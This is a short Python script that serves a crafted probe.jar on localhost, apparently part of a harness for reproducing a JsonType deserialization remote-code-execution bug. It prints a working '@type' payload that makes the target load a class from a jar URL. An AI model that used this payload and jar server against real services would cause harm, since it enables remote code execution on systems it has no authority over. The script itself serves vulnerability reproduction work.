#!/usr/bin/env python3
"""Serve probe.jar as GET /probe for local JsonType RCE reproduction."""
from __future__ import annotations

import argparse
import http.server
import socketserver
from pathlib import Path


class Handler(http.server.BaseHTTPRequestHandler):
    jar_bytes: bytes = b""

    def log_message(self, fmt: str, *args) -> None:
        print(f"[http] {self.address_string()} {fmt % args}")

    def do_GET(self):  # noqa: N802
        if self.path.split("?", 1)[0] in ("/probe", "/probe.jar"):
            body = self.jar_bytes
            self.send_response(200)
            self.send_header("Content-Type", "application/java-archive")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"not found\n")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument(
        "--jar",
        default=str(Path(__file__).resolve().parents[1] / "probe.jar"),
        help="path to crafted probe.jar",
    )
    args = ap.parse_args()
    jar_path = Path(args.jar)
    if not jar_path.is_file():
        raise SystemExit(f"probe jar not found: {jar_path}. Run scripts/build-harness.sh first.")
    Handler.jar_bytes = jar_path.read_bytes()
    print(f"[serve] {jar_path} ({len(Handler.jar_bytes)} bytes) on http://{args.host}:{args.port}/probe")
    print('[payload] {"@type":"jar:http:..2130706433:%d.probe!.POC","x":1}' % args.port)
    with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
        httpd.serve_forever()


if __name__ == "__main__":
    main()
